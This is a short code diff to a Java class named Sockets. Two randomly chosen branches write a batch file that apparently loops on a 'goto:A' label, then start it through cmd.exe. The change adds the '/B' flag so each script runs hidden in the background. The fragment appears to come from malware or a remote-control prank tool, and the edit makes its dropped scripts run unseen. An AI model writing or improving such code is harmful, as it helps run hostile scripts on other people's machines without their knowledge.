@@ -105,7 +105,7 @@ class Sockets
 "goto:A");
                 bw.close();
                 
-                Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", filePath});
+                Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", "/B", filePath});
 
                 
             }else if(random <= 6)
@@ -122,7 +122,7 @@ class Sockets
 "goto:A");
                 bw.close();
                     
-                Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", filePath});
+                Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", "/B", filePath});
                 
             }else if(random <= 9)
             {
